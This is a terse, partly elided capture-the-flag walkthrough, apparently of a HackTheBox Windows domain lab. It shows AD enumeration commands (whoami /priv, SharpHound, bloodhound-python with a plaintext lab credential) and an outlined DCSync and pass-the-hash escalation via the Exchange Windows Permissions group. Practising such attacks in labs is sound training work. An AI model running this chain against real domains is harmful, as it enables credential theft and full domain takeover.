...
ok lets look at privleges and see what we get:
```
whoami /priv
...
im going to upload powerview.ps1 since i am on winrm:
...
i will also upload Sharphound.exe and run:
`.\SharpHound.exe -c All -d htb.local --zip`

turns out i cant run sharphound as this box is on an older version of .net, so i will download and use bloodhound-python:
```
sudo apt update
...
```
bloodhound-python \
  -d htb.local -u 'svc-alfresco' -p 's3rvice' \
  -ns 10.10.10.161 -dc FOREST.HTB.LOCAL \
  --dns-tcp -c All --zip
...
INFO: Compressing output into 20250818205827_bloodhound.zip 
```

nice lets get this up and going on our kali machine:
```
sudo neo4j console
...
login and then upload my data I extracted.

we find out svc-alfresco can perform a dsync attack to domain controller so:
first we have to add him to the Exchange Windows Permissions group:
...
next lets confirm he is in that group
...
lets pass the hash as admin and root domain:
```
